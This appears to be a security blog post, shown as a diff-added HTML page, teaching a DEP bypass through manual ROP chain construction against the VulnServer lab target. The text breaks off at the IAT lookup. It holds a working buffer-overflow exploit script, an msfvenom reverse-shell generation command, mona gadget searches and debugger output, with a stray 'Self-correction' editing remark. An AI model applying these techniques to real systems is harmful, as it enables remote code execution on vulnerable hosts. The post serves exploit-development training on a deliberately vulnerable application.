@@ -1,0 +1,647 @@
+<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><link rel="icon" href="/favicon.ico"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preconnect" href="https://fonts.googleapis.com"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"/><title>xbz0n@sh:~# <!-- -->VirtualProtect DEP Bypass: Step-By-Step Exploit</title><meta name="description" content="Data Execution Prevention (DEP) has been a game-changer in exploit development. The days of simply overflowing a buffer, jumping to your shellcode, and calli..."/><meta property="og:type" content="article"/><meta property="og:url" content="https://xbz0n.sh/blog/virtualprotect_dep_bypass_guide"/><meta property="og:title" content="VirtualProtect DEP Bypass: Step-By-Step Exploit"/><meta property="og:description" content="Data Execution Prevention (DEP) has been a game-changer in exploit development. The days of simply overflowing a buffer, jumping to your shellcode, and calli..."/><meta property="og:image" content="https://xbz0n.sh/images/dep-bypass.jpeg"/><meta property="og:image:width" content="1200"/><meta property="og:image:height" content="630"/><meta property="og:image:alt" content="VirtualProtect DEP Bypass: Step-By-Step Exploit"/><meta property="twitter:card" content="summary_large_image"/><meta property="twitter:url" content="https://xbz0n.sh/blog/virtualprotect_dep_bypass_guide"/><meta property="twitter:title" content="VirtualProtect DEP Bypass: Step-By-Step Exploit"/><meta property="twitter:description" content="Data Execution Prevention (DEP) has been a game-changer in exploit development. The days of simply overflowing a buffer, jumping to your shellcode, and calli..."/><meta property="twitter:image" content="https://xbz0n.sh/images/dep-bypass.jpeg"/><meta property="image" content="https://xbz0n.sh/images/dep-bypass.jpeg"/><meta property="author" content="Ivan Spiridonov"/><link rel="canonical" href="https://xbz0n.sh/blog/virtualprotect_dep_bypass_guide"/><meta name="next-head-count" content="24"/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin /><link rel="preload" href="/_next/static/css/be284b2f70ed0068.css" as="style"/><link rel="stylesheet" href="/_next/static/css/be284b2f70ed0068.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-ee7e63bc15b31913.js" defer=""></script><script src="/_next/static/chunks/framework-64ad27b21261a9ce.js" defer=""></script><script src="/_next/static/chunks/main-0a3c670da7f1f1eb.js" defer=""></script><script src="/_next/static/chunks/pages/_app-6f140346224d0b31.js" defer=""></script><script src="/_next/static/chunks/676-8a913a0c6948fe82.js" defer=""></script><script src="/_next/static/chunks/pages/blog/%5Bslug%5D-80e53230ab478c73.js" defer=""></script><script src="/_next/static/EJgAsPo3Kz3qeohT_5Phd/_buildManifest.js" defer=""></script><script src="/_next/static/EJgAsPo3Kz3qeohT_5Phd/_ssgManifest.js" defer=""></script><style data-href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap">@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=tDbY2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKxjPg&skey=48ad01c60053c2ae&v=v24) format('woff')}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=tDbY2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8-qxjPg&skey=48ad01c60053c2ae&v=v24) format('woff')}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=tDbY2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8L6tjPg&skey=48ad01c60053c2ae&v=v24) format('woff')}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx3cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxTcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxPcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx_cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx7cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwgknk-4.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx3cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxTcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxPcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx_cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx7cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwgknk-4.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx3cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxTcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxPcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx_cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx7cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwgknk-4.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}</style></head><body><div id="__next"><div class="flex flex-col min-h-screen"><nav class="bg-primary/80 backdrop-blur-sm sticky top-0 z-10 shadow-md"><div class="container py-4"><div class="flex items-center justify-between"><div class="flex items-center space-x-6"><a href="/"><span class="text-xl font-bold tracking-tighter bg-gradient-to-r from-accent to-blue-500 bg-clip-text text-transparent">xbz0n@sh:~#</span></a><div class="hidden md:flex space-x-6"><a class="nav-link" href="/">Home</a><a class="nav-link" href="/about">About</a><a class="nav-link" href="/blog">Blog</a><a class="nav-link" href="/tools">Tools</a><a class="nav-link" href="/cves">CVEs</a></div></div><div class="hidden md:flex items-center space-x-4"><a href="mailto:ivanspiridonov@gmail.com" class="text-gray-300 hover:text-accent" aria-label="Email"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M502.3 190.8c3.9-3.1 9.7-.2 9.7 4.7V400c0 26.5-21.5 48-48 48H48c-26.5 0-48-21.5-48-48V195.6c0-5 5.7-7.8 9.7-4.7 22.4 17.4 52.1 39.5 154.1 113.6 21.1 15.4 56.7 47.8 92.2 47.6 35.7.3 72-32.8 92.3-47.6 102-74.1 131.6-96.3 154-113.7zM256 320c23.2.4 56.6-29.2 73.4-41.4 132.7-96.3 142.8-104.7 173.4-128.7 5.8-4.5 9.2-11.5 9.2-18.9v-19c0-26.5-21.5-48-48-48H48C21.5 64 0 85.5 0 112v19c0 7.4 3.4 14.3 9.2 18.9 30.6 23.9 40.7 32.4 173.4 128.7 16.8 12.2 50.2 41.8 73.4 41.4z"></path></svg></a><a href="https://github.com/xbz0n" target="_blank" rel="noopener noreferrer" class="text-gray-300 hover:text-accent" aria-label="GitHub"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 496 512" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg></a><a href="https://twitter.com/xbz0n" target="_blank" rel="noopener noreferrer" class="text-gray-300 hover:text-accent" aria-label="Twitter"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path></svg></a><a href="https://www.linkedin.com/in/ivanspiridonov/" target="_blank" rel="noopener noreferrer" class="text-gray-300 hover:text-accent" aria-label="LinkedIn"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M100.28 448H7.4V148.9h92.88zM53.79 108.1C24.09 108.1 0 83.5 0 53.8a53.79 53.79 0 0 1 107.58 0c0 29.7-24.1 54.3-53.79 54.3zM447.9 448h-92.68V302.4c0-34.7-.7-79.2-48.29-79.2-48.29 0-55.69 37.7-55.69 76.7V448h-92.78V148.9h89.08v40.8h1.3c12.4-23.5 42.69-48.3 87.88-48.3 94 0 111.28 61.9 111.28 142.3V448z"></path></svg></a><a href="https://app.hackthebox.com/public/users/8208" target="_blank" rel="noopener noreferrer" class="text-gray-300 hover:text-accent" aria-label="HackTheBox"><svg stroke="currentColor" fill="currentColor" stroke-width="0" role="img" viewBox="0 0 24 24" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><title></title><path d="M11.9959.0008a1.1187 1.1187 0 00-.057.002.8993.8993 0 00-.2358.0498.9067.9067 0 00-.1652.079L1.9357 5.675a.889.889 0 00-.4444.7699c0 .006.0004.0128.0006.0192-.0002.007 0 .014 0 .0212V17.556a.889.889 0 00.469.7837l9.5983 5.5416c.018.0102.036.0197.054.0287v.002a.8568.8568 0 00.083.0348c0 .001.01.003.012.004.028.01.056.0177.085.0245.01.001.011.003.016.004.028.006.057.0112.086.0146 0 .0005.01.0009.014.001.03.003.061.005.091.005s.061-.002.091-.005c0-.0005.01-.0009.014-.001a.6831.6831 0 00.086-.0146c.01-.001.011-.002.016-.004a.9404.9404 0 00.085-.0245c0-.001.01-.003.012-.004a.8818.8818 0 00.083-.0347v-.002a1.086 1.086 0 00.054-.0287l9.5986-5.5416a.889.889 0 00.4689-.7837V6.4786c0-.009-.0006-.0172-.0008-.0258h.0003v-.008a.8886.8886 0 00-.3117-.6755c-.01-.008-.019-.0162-.029-.0241 0-.002-.01-.005-.01-.007a.8988.8988 0 00-.1074-.0705L12.4533.1267a.8872.8872 0 00-.4646-.1266zm.01 2.2523c.072 0 .1443.0187.209.056l6.5366 3.774c.2789.161.2789.5633 0 .7243l-6.5367 3.774a.4182.4182 0 01-.4182 0L5.26 6.8074c-.2788-.1609-.2789-.5633 0-.7243l6.5368-3.774a.4193.4193 0 01.209-.056zm-8.0801 6.458a.4145.4145 0 01.215.0565l6.524 3.7666a.417.417 0 01.2086.3612v7.5326c0 .3212-.3477.522-.626.3613l-6.5237-3.7666a.4172.4172 0 01-.2086-.3613V9.1288c0-.2408.1955-.414.4107-.4177zm16.1599 0c.215.004.4107.1768.4107.4177v7.5325c0 .149-.08.2868-.2087.3614l-6.5239 3.7666c-.278.1606-.6258-.0401-.6258-.3614v-7.5325c0-.149.08-.2867.2086-.3613l6.5238-3.7666a.415.415 0 01.2152-.0565z"></path></svg></a></div><button class="md:hidden focus:outline-none" aria-label="Toggle menu"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" class="h-6 w-6 text-gray-300" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M16 132h416c8.837 0 16-7.163 16-16V76c0-8.837-7.163-16-16-16H16C7.163 60 0 67.163 0 76v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16z"></path></svg></button></div></div></nav><main class="flex-grow container py-8"><article class="max-w-3xl mx-auto"><a class="text-accent hover:text-accent/80 mb-8 inline-block" href="/blog">← Back to all posts</a><div class="mb-8"><h1 class="text-3xl md:text-4xl font-bold mb-4">VirtualProtect DEP Bypass: Step-By-Step Exploit</h1><div class="flex items-center text-sm text-gray-400"><time dateTime="2025-04-08">April 8, 2025</time></div></div><div class="blog-content">
+<p><img src="/images/dep-bypass.jpeg" alt="ROP chain exploitation techniques"></p>
+<h2>Introduction</h2>
+<p>Data Execution Prevention (DEP) has been a game-changer in exploit development. The days of simply overflowing a buffer, jumping to your shellcode, and calling it a day are long gone. DEP enforces a simple rule: memory can be writable OR executable, but not both at the same time.</p>
+<p>So what happens when you try to execute shellcode in a classic buffer overflow? DEP detects code execution from a writable memory area and shuts everything down. Game over.</p>
+<p>But DEP isn't the impenetrable wall it appears to be. Through the magic of Return-Oriented Programming (ROP), we can leverage existing executable code to call Windows APIs that change memory protections, effectively bypassing DEP.</p>
+<p>In this guide, I'll walk you through manually creating a ROP chain to exploit VulnServer's TRUN command vulnerability with DEP enabled. Unlike many tutorials that rely on automated tools, we'll build our exploit piece by piece, understanding each step along the way.</p>
+<h2>Prerequisites</h2>
+<ul>
+<li>Windows 7/10 (32-bit) with WinDbg or Immunity Debugger with Mona.py. (This guide focuses on the 32-bit architecture).</li>
+<li>VulnServer running on a Windows VM (ensure it's the 32-bit version).</li>
+<li>Python 3 for exploit development</li>
+<li>Basic understanding of vanilla buffer overflows</li>
+</ul>
+<h2>1. Understanding the Vulnerability</h2>
+<p>Let's start by confirming that DEP is indeed preventing our standard exploit. A typical buffer overflow exploit for VulnServer would look like this:</p>
+<pre class="language-python"><code class="language-python">import struct
+import socket
+
+target = ("192.168.0.111", 9999)  # VulnServer
+
+VULNSRVR_CMD = b"TRUN /.:/"
+OFFSET = 2003  # Bytes until we reach EIP
+JMP_ESP = 0x625011AF  # Address of a JMP ESP instruction
+
+# Shellcode - msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.10 LPORT=4444 -f python -b '\x00'
+shellcode = b"SHELLCODE"
+
+payload = VULNSRVR_CMD
+payload += b"A" * OFFSET
+payload += struct.pack("&#x3C;I", JMP_ESP)
+payload += b"\x90" * 16  # NOP sled
+payload += shellcode
+
+with socket.create_connection(target) as sock:
+    sock.recv(512)  # Welcome message
+    sock.send(payload)
+    print("[+] Exploit sent")
+</code></pre>
+<p>When we run this with DEP enabled, our exploit fails with an access violation. Checking memory protection in the debugger confirms the issue:</p>
+<pre class="language-none"><code class="language-none">!vprot esp
+</code></pre>
+<p>Output:</p>
+<pre class="language-none"><code class="language-none">BaseAddress:       00b4f000
+AllocationBase:    00950000
+AllocationProtect: 00000004  PAGE_READWRITE
+RegionSize:        00001000
+State:             00001000  MEM_COMMIT
+Protect:           00000004  PAGE_READWRITE
+Type:              00020000  MEM_PRIVATE
+</code></pre>
+<p>The stack is marked as PAGE_READWRITE (not executable), confirming DEP is active and blocking our shellcode execution.</p>
+<h2>2. Finding the Buffer Overflow Offset</h2>
+<p>First things first - we need to find exactly where our input overwrites EIP:</p>
+<ol>
+<li>Generate a cyclic pattern:</li>
+</ol>
+<pre class="language-none"><code class="language-none">!py mona pc 3000
+</code></pre>
+<p>Output:</p>
+<pre class="language-none"><code class="language-none">
+Creating cyclic pattern of 3000 bytes
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7...
+</code></pre>
+<ol start="2">
+<li>Create a script to send this pattern:</li>
+</ol>
+<pre class="language-python"><code class="language-python">pattern = b"Aa0Aa1Aa2Aa3Aa4Aa5..." # Copy from mona output
+payload = b"TRUN /.:/" + pattern
+</code></pre>
+<ol start="3">
+<li>After sending the pattern and crashing the server, find our exact offset:</li>
+</ol>
+<pre class="language-none"><code class="language-none">!py mona findmsp -distance 3000
+</code></pre>
+<p>Output:</p>
+<pre class="language-none"><code class="language-none">[+] Examining registers
+ EIP contains normal pattern : 0x396f4338 (offset 2003)
+ ESP (0x00ecf9c8) points at offset 2010 in normal pattern (length 984)
+ EBP contains normal pattern : 0x6f43376f (offset 2001)
+</code></pre>
+<p>We now know our offset to EIP is 2003 bytes.</p>
+<h2>3. Manual Gadget Hunting</h2>
+<p>This is where the real work begins. To build our ROP chain, we need to find small code snippets ("gadgets") in memory that end with a RET instruction. These will be the building blocks of our DEP bypass.</p>
+<h3>3.1 Finding Base ROP Gadgets</h3>
+<ol>
+<li>First, lets identify non-ASLR modules:</li>
+</ol>
+<pre class="language-none"><code class="language-none">!py mona modules
+</code></pre>
+<p>Output:</p>
+<pre class="language-none"><code class="language-none">0x62500000 | 0x62508000 | 0x00008000 | False  | False   | False | False |  False   | False  | -1.0- [essfunc.dll] (C:\VulnApps\essfunc.dll) 0x0
+0x00400000 | 0x00407000 | 0x00007000 | False  | False   | False | False |  False   | False  | -1.0- [vulnserver.exe] (C:\VulnApps\vulnserver.exe) 0x0
+</code></pre>
+<p>We'll use essfunc.dll because it's typically compiled without ASLR (Address Space Layout Randomization) and Rebase support in standard VulnServer setups (indicated by 'False' in the ASLR/Rebase columns). This simplifies our focus on the DEP bypass itself. Bypassing ASLR would require additional techniques, such as information leaks to find module base addresses dynamically, which are beyond the scope of this specific guide.</p>
+<ol start="2">
+<li>Find a simple RET instruction (ROP NOP):</li>
+</ol>
+<pre class="language-none"><code class="language-none">!py mona find -type instr -s "ret" -m essfunc -cpb "\x00"
+</code></pre>
+<p>Output:</p>
+<pre class="language-none"><code class="language-none">0x62501022 : ret | {PAGE_EXECUTE_READ} [essfunc.dll]
+0x62501057 : ret | {PAGE_EXECUTE_READ} [essfunc.dll]
+0x625010b6 : ret | {PAGE_EXECUTE_READ} [essfunc.dll]
+0x625011ab : ret | {PAGE_EXECUTE_READ} [essfunc.dll]
+</code></pre>
+<p>We'll use 0x62501022 as our ROP NOP.</p>
+<ol start="3">
+<li>Find a JMP ESP gadget:</li>
+</ol>
+<pre class="language-none"><code class="language-none">!py mona jmp -r esp -m essfunc -cpb "\x00"
+</code></pre>
+<p>Output:</p>
+<pre class="language-none"><code class="language-none">0x625011AF : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll]
+0x625011C7 : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll]
+</code></pre>
+<p>We'll use 0x625011AF for our JMP ESP gadget later if needed, but the primary one for the final VirtualProtect return will be identified separately (we used 0x625011c7 in the final chain). (Self-correction: Clarified the JMP ESP usage slightly).</p>
+<h3>3.2 Finding System DLL Gadgets</h3>
+<p>We also need gadgets from system DLLs to complete our chain:</p>
+<ol>
+<li>Find PUSHAD instruction:</li>
+</ol>
+<pre class="language-none"><code class="language-none">!py mona find -type instr -s "pushad # ret" -m "msvcrt,ntdll,kernel32" -cpb "\x00"
+</code></pre>
+<p>Output:</p>
+<pre class="language-none"><code class="language-none">0x775d6f67 : pushad | ret [msvcrt.dll]
+</code></pre>
+<ol start="2">
+<li>Find gadgets for setting other registers:</li>
+</ol>
+<pre class="language-none"><code class="language-none">!py mona find -type instr -s "xchg eax, edx # ret" -m "ntdll" -cpb "\x00"
+</code></pre>
+<p>Output:</p>
+<pre class="language-none"><code class="language-none">0x77d9e6c0 : xchg eax, edx | ret | {PAGE_EXECUTE_READ} [ntdll.dll]
+</code></pre>
+<ol start="3">
+<li>Find gadgets for setting "neg eax, ret" registers:</li>
+</ol>
+<pre class="language-none"><code class="language-none">!py mona find -type instr -s "neg eax # ret" -m "kernel32" -cpb "\x00"
+</code></pre>
+<p>Output:</p>
+<pre class="language-none"><code class="language-none">0x76505808 : neg eax | ret | {PAGE_EXECUTE_READ} [KERNEL32.dll]
+</code></pre>
+<h2>4. Finding VirtualProtect in IAT</h2>
+<p>To bypass DEP, we'll use Windows' VirtualProtect function to change memory permissions. First, we need to find its address in the Import Address Table (IAT):</p>
+<ol>
+<li>Examine the IAT and search for VirtualProtect:</li>
+</ol>
+<pre class="language-none"><code class="language-none">!dh essfunc -f
+</code></pre>
+<p>Output:</p>
+<pre class="language-none"><code class="language-none"> 5000 [     197] address [size] of Export Directory
+ 6000 [     224] address [size] of Import Directory
+    0 [       0] address [size] of Resource Directory
+    0 [       0] address [size] of Exception Directory
